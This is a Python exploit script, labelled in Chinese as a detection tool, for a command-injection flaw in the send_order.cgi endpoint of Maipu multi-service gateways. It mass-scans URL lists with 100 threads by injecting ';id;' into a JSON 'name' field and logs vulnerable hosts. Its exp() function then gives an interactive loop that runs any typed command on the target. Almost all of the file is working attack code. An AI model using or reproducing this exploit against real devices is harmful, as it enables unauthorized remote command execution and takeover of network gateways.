import requests
import argparse
import sys
import time
import re
import warnings
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore")


def banner():
    print("欢迎使用迈普多业务融合网关漏洞检测工具")


def main():
    # banner()  # 显示欢迎信息

    # 处理命令行参数
    parser = argparse.ArgumentParser(description="迈普多业务融合网关 send_order.cgi 命令执行漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断参数类型，并调用相应的函数处理
    if args.url and not args.file:
        if poc(args.url):
        	exp(args.url)

    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/send_order.cgi?parameter=operation'
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    data = """{"opid": "1", "name": ";id;","type": "rest"}"""
    try:
        res1 = requests.get(url=target, headers=header, verify=False,proxies=proxies)
        if res1.status_code == 200:
            res2 = requests.post(url=target + url_payload, data=data, headers=header, verify=False,proxies=proxies)
            print(res2.status_code)
            if res2.status_code == 200:
                print(f"[+]该url{target}存在命令执行漏洞")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
                    return True
            else:
                print(f'[-]该url{target}不存在命令执行漏洞')

        else:
            pass

    except Exception as e:
        print(f'[*]该网站{target}可能存在问题，请手工测试')


def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        data1=input("输入你要执行的命令,q退出")
        if data1 == 'q':
            print("正在退出，请等候....")
            break
        url_payload = '/send_order.cgi?parameter=operation'
        header = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }        
        data = {
            "opid": "1",
            "name": f";{data1};",
            "type": "rest"
        }
        try:
            res = requests.post(url=target+url_payload, headers=header, data=data, proxies=proxies)
            if res.status_code == 200:
                print("命令执行成功")
            else:
                print("命令执行失败")
        except Exception as e:
            pass

if __name__ == '__main__':
    main()
